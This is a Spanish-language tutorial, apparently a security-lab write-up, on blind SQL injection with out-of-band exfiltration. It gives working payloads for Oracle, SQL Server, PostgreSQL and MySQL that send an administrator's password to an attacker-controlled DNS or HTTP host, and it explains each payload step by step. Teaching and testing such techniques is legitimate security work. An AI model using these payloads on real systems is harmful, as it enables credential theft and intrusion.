### **Blind SQL Injection con Exfiltración Out-of-Band (OOB)**  

El ataque **Blind SQL Injection con Exfiltración Out-of-Band (OOB)** se basa en **extraer datos** de una base de datos remota enviándolos a un servidor externo controlado por el atacante. A diferencia de la técnica OOB utilizada solo para **confirmar la inyección**, en este caso **transmitimos información sensible**, como credenciales de usuario.  

Este enfoque es útil cuando:  
✅ La base de datos permite hacer peticiones externas (HTTP, DNS).  
✅ No hay mensajes de error visibles.  
✅ No podemos inferir información a partir de respuestas o tiempos de ejecución.  

---

## **1. Exfiltración de datos a través de peticiones externas**  

Para exfiltrar datos, forzamos a la base de datos a **incluir información sensible en una petición a un servidor externo**. De esta forma, la información llega a nuestro servidor sin necesidad de verla directamente en la respuesta de la aplicación web.  

Cada motor de base de datos tiene su propia manera de hacer solicitudes externas. En la siguiente tabla se muestran algunos métodos para extraer datos:  

| **Base de Datos** | **Payload de Exfiltración OOB** |  
|------------------|---------------------------------|  
| **Oracle** | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |  
| **Microsoft SQL Server** | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |  
| **PostgreSQL** | `create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();` |  
| **MySQL (Windows)** | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |  

📌 **Reemplaza `YOUR-QUERY-HERE` con la consulta a la base de datos que quieres extraer.**  

Si la base de datos ejecuta uno de estos payloads, **envía la contraseña como parte del subdominio de la petición**, lo que nos permite capturarla en nuestro servidor.  

---

## **2. Configuración del servidor para recibir datos**  

Para recibir los datos exfiltrados, podemos usar **Burp Collaborator** o configurar nuestro propio servidor DNS/HTTP.  

### **📌 Opción 1: Burp Collaborator (recomendada)**  
1. Abrimos **Burp Suite** → **Burp Collaborator Client**.  
2. Copiamos el subdominio generado (ejemplo: `ypr54uv2uaau7xac13ptor0o0f66uxim.oastify.com`).  
3. Lo insertamos en nuestra inyección SQL.  
4. Si la inyección es exitosa, **veremos la solicitud en Collaborator con la contraseña en el subdominio**.  

---

## **3. Ejemplo de Exfiltración en Oracle**  

Si la base de datos es **Oracle**, probamos el siguiente payload en una cookie vulnerable:  

```
Cookie: TrackingId=tuFRVGYqMES2D7o3' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.ypr54uv2uaau7xac13ptor0o0f66uxim.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
```  

Si el sistema es vulnerable, Oracle intentará resolver un dominio como:  

```
n6g7sd98g87fsd.ypr54uv2uaau7xac13ptor0o0f66uxim.oastify.com
```  

Donde **"n6g7sd98g87fsd"** es la contraseña real del usuario `administrator`.  

📌 **Si vemos la petición en Burp Collaborator con la contraseña en el subdominio, significa que la exfiltración fue exitosa.**  

---

## **4. Explicación del Payload**  

```
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```  

### **🔎 Desglose del payload:**  

1. **`UNION SELECT`**  
   - Se usa para fusionar el resultado de una consulta arbitraria con la respuesta de la aplicación.  

2. **`EXTRACTVALUE(xmltype(...), '/l')`**  
   - En Oracle, esta función se usa para procesar XML y extraer valores.  
   - Se inyecta un XML malicioso que contiene una entidad externa.  

3. **`<!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">`**  
   - Define una **entidad externa** (`%remote`) que carga un recurso desde un dominio controlado por el atacante.  
   - **La contraseña se inserta dentro del subdominio de la URL.**  

4. **`FROM dual`**  
   - `dual` es una tabla especial en Oracle usada para ejecutar consultas sin depender de datos de usuario.  

### **📌 ¿Qué sucede cuando se ejecuta este payload?**  

🔹 Oracle intenta resolver la URL generada.  
🔹 La contraseña aparece en el subdominio de la petición.  
🔹 Burp Collaborator captura la solicitud y muestra la contraseña.  

---

## **5. Variaciones para otros motores de base de datos**  

Si el payload anterior no funciona, probamos otros dependiendo del motor:  

### **SQL Server**  

```
declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```  

- Ejecuta la función `xp_dirtree`, que lista directorios remotos.  
- En sistemas vulnerables, se genera una solicitud SMB con la contraseña en el subdominio.  

---

### **PostgreSQL**  

```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT password FROM users WHERE username='administrator');
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```  

- Ejecuta el comando `nslookup` en el sistema operativo.  
- Si PostgreSQL tiene permisos suficientes, intenta resolver el dominio, enviando la contraseña en el subdominio.  

---

### **MySQL (Windows)**  

```
SELECT password INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' FROM users WHERE username='administrator'
```  

- Solo funciona en **Windows** si MySQL tiene permisos para acceder a archivos.  
- Intenta escribir un archivo en un recurso compartido SMB con la contraseña como parte del nombre.  

---

## **6. Conclusión**  

La **Exfiltración Out-of-Band (OOB)** es una técnica poderosa para extraer datos sensibles de bases de datos que permiten realizar peticiones externas.  

### **📌 Resumen del proceso:**  

✅ **Paso 1:** Identificamos si la base de datos permite conexiones externas.  
✅ **Paso 2:** Usamos un payload para incluir información en una solicitud externa.  
✅ **Paso 3:** Configuramos Burp Collaborator o un servidor propio para recibir las peticiones.  
✅ **Paso 4:** Capturamos la solicitud con la contraseña en el subdominio.  

🚀 **Este método es altamente efectivo en ambientes blindados donde no podemos obtener respuestas directas de la base de datos.**
